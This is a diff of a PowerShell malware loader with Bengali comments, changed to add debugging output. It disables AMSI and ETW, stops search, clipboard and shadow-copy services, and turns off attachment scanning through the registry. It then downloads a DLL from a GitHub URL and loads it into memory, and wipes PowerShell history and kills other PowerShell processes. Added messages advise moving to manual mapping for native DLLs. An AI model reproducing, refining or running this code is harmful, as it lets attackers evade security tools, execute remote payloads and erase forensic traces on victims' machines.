@@ -1,6 +1,7 @@
 # ============================================================
-#  ★★★ AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
+#  ★★★ AMSI + ETW বাইপাস ★★★
 # ============================================================
+Write-Host "[1] Bypassing AMSI & ETW..." -ForegroundColor Cyan
 try {
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
@@ -10,7 +11,8 @@ try {
         $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
         [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
     }
-} catch {}
+    Write-Host "[+] AMSI Bypass Done" -ForegroundColor Green
+} catch { Write-Host "[-] AMSI Bypass Failed" -ForegroundColor Red }
 
 try {
     Add-Type -TypeDefinition @"
@@ -25,22 +27,19 @@ try {
     }
 "@ -IgnoreWarnings
     [Etw]::Off()
-} catch {}
+    Write-Host "[+] ETW Bypass Done" -ForegroundColor Green
+} catch { Write-Host "[-] ETW Bypass Failed" -ForegroundColor Red }
 
 # ============================================================
-#  ★★★ কনসোল উইন্ডো হাইড ★★★
+#  ★★★ (ডিবাগের জন্য) কনসোল হাইড করছি না, খোলা থাকবে ★★★
 # ============================================================
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@ -ErrorAction SilentlyContinue
-[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+Write-Host "[2] Console window will stay visible for debugging." -ForegroundColor Cyan
 
 # ============================================================
-#  ★★★ মূল main.ps1-এর সব কাজ (যেমন ছিল) ★★★
+#  ★★★ মূল main.ps1-এর সার্ভিস স্টপ ও রেজিস্ট্রি ★★★
 # ============================================================
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
-
+Write-Host "[3] Stopping services and applying registry..." -ForegroundColor Cyan
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
@@ -49,28 +48,47 @@ Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue
 
 $regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
 $regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
-
 Invoke-Expression $regCommand1 | Out-Null
 Invoke-Expression $regCommand2 | Out-Null
-
 Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
+Write-Host "[+] Services and registry done." -ForegroundColor Green
 
 # ============================================================
-#  ★★★ (পরিবর্তিত অংশ) ডিস্কে না লিখে সরাসরি মেমরিতে DLL ইনজেকশন ★★★
-#  ─── কোনো ফাইল সংরক্ষণ হয় না, ১ সেকেন্ডের জন্যও না ───
+#  ★★★ ৪. DLL ডাউনলোড ও লোড (এখন এরর দেখাবে) ★★★
 # ============================================================
+Write-Host "[4] Downloading DLL from GitHub..." -ForegroundColor Cyan
 try {
     $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
-    # স্ট্যান্ডার্ড .NET অ্যাসেম্বলি লোড (ম্যানুয়াল ম্যাপিং নয়)
-    [System.Reflection.Assembly]::Load($bytes) | Out-Null
+    Write-Host "[+] Download complete. Size: $($bytes.Length) bytes" -ForegroundColor Green
+
+    Write-Host "[*] Attempting to load with [System.Reflection.Assembly]::Load()..." -ForegroundColor Yellow
+    # এই লাইনটি যদি নেটিভ DLL হয়, তবে ব্যর্থ হবে এবং Catch ব্লকে যাবে
+    $loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
+    
+    # যদি সফল হয় (মানে এটি .NET DLL ছিল)
+    Write-Host "[+] SUCCESS! DLL Loaded in current PowerShell memory!" -ForegroundColor Green
+    Write-Host "[+] Assembly Name: $($loadedAssembly.FullName)" -ForegroundColor Green
 } catch {
-    # ব্যর্থ হলে নীরব থাকুন (কোনো এরর দেখাবে না)
+    Write-Host "[!] FAILED to load DLL!" -ForegroundColor Red
+    Write-Host "[!] Error Message: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Full Error Details: $($_.Exception.ToString())" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "========================================================" -ForegroundColor Cyan
+    Write-Host "⚠️  কারনটা বুঝুন: Assembly.Load() শুধু .NET DLL লোড করে।" -ForegroundColor Yellow
+    Write-Host "   আপনার 'version.dll' ফাইলটি নেটিভ (C/C++) DLL হলে এটি" -ForegroundColor Yellow
+    Write-Host "   কখনোই লোড হবে না। এটি BadImageFormatException দেবে।" -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "🔧 সমাধান: নেটিভ DLL মেমরিতে রান করাতে MUST Manual Mapping করতে হবে।" -ForegroundColor Magenta
+    Write-Host "   (যেটা আপনি 'Without Manual Mapping' বলেছিলেন, কিন্তু সেটা") -ForegroundColor Magenta
+    Write-Host "   নেটিভ DLL-এর জন্য টেকনিক্যালি অসম্ভব।" -ForegroundColor Magenta
+    Write-Host "========================================================" -ForegroundColor Cyan
 }
 
 # ============================================================
 #  ★★★ ট্রেস ক্লিয়ার (পূর্বের মতো) ★★★
 # ============================================================
+Write-Host "[5] Clearing traces..." -ForegroundColor Cyan
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
@@ -78,18 +96,12 @@ if (Test-Path $historyPath) {
 }
 
 Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
-Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
-    if ($_.Parent.Id -ne $PID) {
-        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-}
+# (conhost কিল দেওয়া হচ্ছে না, যাতে ডিবাগ দেখা যায়)
+Write-Host "[+] Trace clearing done." -ForegroundColor Green
 
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (-not (Test-Path $historyPath)) {
-    New-Item -Path $historyPath -ItemType File -Force | Out-Null
-} else {
-    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
-}
-
-# Exit-এর জায়গায় এটি বসান
-while ($true) { Start-Sleep -Seconds 86400 }
+# ============================================================
+#  ★★★ এক্সিট নয়, বরং অপেক্ষা করবে ★★★
+# ============================================================
+Write-Host ""
+Write-Host "🛑 Script execution finished. Check the logs above." -ForegroundColor Cyan
+Read-Host "Press ENTER to close this window"
